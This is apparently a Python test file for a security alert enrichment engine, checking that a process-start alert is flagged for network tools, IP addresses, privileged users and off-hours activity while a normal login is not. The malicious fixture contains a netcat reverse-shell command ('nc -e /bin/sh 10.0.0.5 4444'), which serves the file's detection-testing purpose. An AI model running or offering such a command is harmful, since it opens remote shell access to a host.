from triagen_core.enrichment_engine import enrich_alert

MALICIOUS_ALERT = {
    "alert_type": "process_start",
    "timestamp": "2026-07-14T02:13:00Z",
    "user": "svc_web",
    "hostname": "prod-web01",
    "category": "process",
    "details": {"command": "nc -e /bin/sh 10.0.0.5 4444"},
}

BENIGN_ALERT = {
    "alert_type": "auth_login",
    "timestamp": "2026-07-14T10:05:00Z",
    "user": "jsmith",
    "hostname": "corp-laptop-042",
    "category": "auth",
    "details": {"command": "office365 sso login"},
}


def test_enrich_alert_flags_reverse_shell_indicators():
    enriched = enrich_alert(MALICIOUS_ALERT)
    assert enriched["executes_network_tool"] is True
    assert enriched["contains_ip_address"] == ["10.0.0.5"]
    assert enriched["user_is_privileged"] is True
    assert enriched["hostname_is_server"] is True
    assert enriched["occurred_off_hours"] is True


def test_enrich_alert_does_not_flag_benign_login():
    enriched = enrich_alert(BENIGN_ALERT)
    assert enriched["executes_network_tool"] is False
    assert enriched["contains_ip_address"] == []
    assert enriched["user_is_privileged"] is False
    assert enriched["occurred_off_hours"] is False
